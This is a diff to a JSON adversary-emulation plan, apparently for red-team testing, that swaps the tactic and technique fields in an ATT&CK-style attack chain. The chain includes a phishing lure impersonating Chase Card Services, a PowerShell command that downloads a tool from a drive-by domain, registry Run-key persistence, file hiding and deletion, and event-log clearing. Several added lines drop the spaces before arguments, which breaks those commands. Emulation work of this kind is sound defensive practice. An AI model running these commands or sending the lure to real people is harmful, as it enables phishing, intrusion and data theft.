@@ -9,16 +9,16 @@
     },
     "procedures": [
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
                 "tool": "self.tool",
@@ -27,8 +27,8 @@
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS",
             "preconditions": {
                 "tool": "self.tool",
@@ -37,8 +37,8 @@
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
                 "self.tool_name": "self.tool",
@@ -49,24 +49,24 @@
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX2",
             "preconditions": {
                 "payload": "self.tool_name2",
@@ -75,16 +75,16 @@
             }
         },
         {
-            "tactic": "PayloadCheapride",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
             }
         },
         {
-            "tactic": "SpearPhishingLink",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "SpearPhishingLink",
             "label": "spearPhishingLink",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -93,13 +93,13 @@
                 "driveby": "self.driveby",
                 "target": "self.target_1",
                 "tune": {
-                    "body": "Your credit card has been stolen on the dark web. Click below for more information:\nhttp://${self.driveby_domain}/${self.payload_name}\nChase Card Services"
+                    "body": "Your credit card has been stolen on the dark web. Click below for more information:\nhttp://${self.driveby_domain}/${self.payload_name}Chase Card Services"
                 }
             }
         },
         {
-            "tactic": "DriveByCompromise",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -109,8 +109,8 @@
             }
         },
         {
-            "tactic": "UserExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -120,8 +120,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -134,8 +134,8 @@
             }
         },
         {
-            "tactic": "ProcessDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "ProcessDiscovery",
             "label": "processDiscovery",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -147,8 +147,8 @@
             }
         },
         {
-            "tactic": "PeripheralDeviceDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "PeripheralDeviceDiscovery",
             "label": "peripheralDeviceDiscovery",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -160,8 +160,8 @@
             }
         },
         {
-            "tactic": "FileAndDirectoryDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "FileAndDirectoryDiscovery",
             "label": "forfiles",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -173,8 +173,8 @@
             }
         },
         {
-            "tactic": "ScreenCapture",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "ScreenCapture",
             "label": "screenCapture",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -186,21 +186,21 @@
             }
         },
         {
-            "tactic": "IngressToolTransfer",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "IngressToolTransfer",
             "label": "ingressToolTransfer",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell mkdir ${self.temp_dir_name}; Invoke-WebRequest -Uri \"${self.driveby_domain2}/${self.tool_name2}\" -OutFile ${self.temp_dir_name}\\${self.tool_name2}; echo \" \""
+                    "command": "powershell mkdir${self.temp_dir_name}; Invoke-WebRequest -Uri \"${self.driveby_domain2}/${self.tool_name2}\" -OutFile${self.temp_dir_name}\\${self.tool_name2}; echo \" \""
                 }
             }
         },
         {
-            "tactic": "ValidAccounts_DomainAccounts",
-            "technique": "PrivilegeEscalation",
+            "tactic": "PrivilegeEscalation",
+            "technique": "ValidAccounts_DomainAccounts",
             "label": "validAccounts_DomainAccounts",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -211,8 +211,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_2",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -222,21 +222,21 @@
             }
         },
         {
-            "tactic": "RegistryRunKeysStartupFolder",
-            "technique": "Persistence",
+            "tactic": "Persistence",
+            "technique": "RegistryRunKeysStartupFolder",
             "label": "addRunRegistryKey",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "tune": {
-                    "command": "cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BackgroundColor /d ${self.temp_dir_name}\\${self.tool_name2} && echo \"\""
+                    "command": "cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BackgroundColor /d${self.temp_dir_name}\\${self.tool_name2}&& echo \"\""
                 }
             }
         },
         {
-            "tactic": "DataFromLocalSystem",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "DataFromLocalSystem",
             "label": "dataFromLocalSystem",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -248,8 +248,8 @@
             }
         },
         {
-            "tactic": "LogonScriptWindows",
-            "technique": "Persistence",
+            "tactic": "Persistence",
+            "technique": "LogonScriptWindows",
             "label": "logonScripts",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -258,8 +258,8 @@
             }
         },
         {
-            "tactic": "DataStaged",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "DataStaged",
             "label": "dataStaged",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -272,8 +272,8 @@
             }
         },
         {
-            "tactic": "TimeStomp",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "TimeStomp",
             "label": "timeStomp",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -285,21 +285,21 @@
             }
         },
         {
-            "tactic": "HiddenFilesAndDirectories",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "HiddenFilesAndDirectories",
             "label": "hiddenFilesAndDirectories",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "tune": {
-                    "command": "cmd /c attrib +H C:\\Users\\Public\\Downloads\\${self.exfil_file} && echo \" \""
+                    "command": "cmd /c attrib +H C:\\Users\\Public\\Downloads\\${self.exfil_file}&& echo \" \""
                 }
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -312,21 +312,21 @@
             }
         },
         {
-            "tactic": "FileDeletionPowershell",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "FileDeletionPowershell",
             "label": "fileDeletion",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "tune": {
-                    "command": "cmd /c del C:\\Users\\Public\\Downloads\\${self.exfil_file} && echo ' '"
+                    "command": "cmd /c del C:\\Users\\Public\\Downloads\\${self.exfil_file}&& echo ' '"
                 }
             }
         },
         {
-            "tactic": "ClearWindowsEventLogs",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "ClearWindowsEventLogs",
             "label": "clearWindowsEventLogs",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -335,8 +335,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExitElevated",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -345,8 +345,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1",
